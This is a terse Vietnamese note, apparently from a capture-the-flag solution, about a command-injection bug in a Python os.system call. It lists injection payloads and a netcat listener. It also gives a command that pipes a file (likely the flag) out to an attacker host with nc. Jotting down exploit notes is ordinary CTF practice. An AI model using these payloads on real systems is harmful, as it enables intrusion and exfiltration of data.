Vuln ở ` os.system(f"python3 generate.py {filename} \"{text}\"")`

payload: `${ls}` hoặc backtick `ls`

reverse shell -> máy mình `nc -lvn 1234`, send `${cat /fa*|nc port host}`